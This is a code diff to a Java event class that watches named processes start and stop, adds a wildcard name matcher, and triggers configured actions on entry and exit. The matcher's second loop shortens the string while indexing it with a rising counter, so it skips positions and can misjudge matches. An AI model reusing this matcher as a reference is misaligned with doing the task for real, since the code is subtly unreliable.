@@ -27,7 +27,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	private int actionOnEnter, actionOnExit;
 	private int type;
 	private boolean active = false;
-	private String name;
+	private String starname;
 
 	@Override
 	public void begin() {
@@ -55,9 +55,10 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 			byte[] procName = new byte[databuffer.readInt()];
 			databuffer.read(procName);
 
-			name = WChar.getString(procName, true);
+			starname = WChar.getString(procName, true);
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: params FAILED");
 
 			return false;
 		}
@@ -73,36 +74,96 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(ProcessInfo process) {
 		String processName = process.processInfo.processName;
-		if (!processName.equals(name)) {
+
+		if (!matchStar(starname, processName)) {
 			return 0;
 		}
+
+		if (process.status == ProcessStatus.START && active == false) {
+			active = true;
+			onEnter();
+		} else if (process.status == ProcessStatus.STOP && active == true) {
+			active = false;
+			onExit();
+		}
+
 		switch (type) {
-			case 0: // Process
-				if (process.status == ProcessStatus.START && active == false) {
-					active = true;
-					onEnter();
-				} else if (process.status == ProcessStatus.STOP && active == true) {
-					active = false;
-					onExit();
-				}
+		case 0: // Process
+			break;
 
-				break;
-
-			case 1: // Window
-			default:
-				break;
+		case 1: // Window
+		default:
+			break;
 		}
 
 		return 0;
 	}
 
+	static boolean matchStar(String wildcardProcess, String processName) {
+
+		if (processName == null) {
+			return (wildcardProcess == null);
+		}
+
+		for (;;) {
+
+			if (wildcardProcess.length() == 0) {
+				return (processName.length() == 0);
+			}
+
+			if (wildcardProcess.charAt(0) == '*') {
+				wildcardProcess = wildcardProcess.substring(1);
+				if (wildcardProcess.length() == 0) {
+					return true;
+				}
+
+				if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
+					int len = processName.length();
+					for (int i = 0; i < len; i++) {
+						char c = processName.charAt(0);
+						processName = processName.substring(1);
+						String tp = wildcardProcess.substring(1);
+						if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
+							return true;
+						}
+					}
+					return false;
+				}
+
+				for (int i = 0; i < processName.length(); i++) {
+					char c = processName.charAt(i);
+					processName = processName.substring(1);
+					if (matchStar(wildcardProcess, processName)) {
+						return true;
+					}
+				}
+				return false;
+			}
+
+			if (processName.length() == 0) {
+				return false;
+			}
+
+			if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != processName.charAt(0)) {
+				return false;
+			}
+
+			processName = processName.substring(1);
+			wildcardProcess = wildcardProcess.substring(1);
+		}
+
+		// NOTREACHED
+	}
+
 	public void onEnter() {
-		if(Cfg.DEBUG) Check.log( TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " (onEnter): triggering " + actionOnEnter + " " + starname);
 		trigger(actionOnEnter);
 	}
 
 	public void onExit() {
-		if(Cfg.DEBUG) Check.log( TAG + " (onExit): triggering " + actionOnExit + " " + name);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " (onExit): triggering " + actionOnExit + " " + starname);
 		trigger(actionOnExit);
 	}
 }
